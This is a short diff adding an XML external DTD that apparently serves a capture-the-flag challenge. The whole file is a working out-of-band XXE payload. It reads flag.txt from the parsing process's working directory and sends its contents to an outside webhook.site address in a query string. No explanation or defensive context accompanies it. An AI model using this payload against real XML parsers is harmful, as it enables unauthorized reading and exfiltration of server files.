@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/self/cwd/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/df02ce14-efab-40d0-8a23-58ae955e652e/?d=%file;'>">
+%eval;
+%exfil;
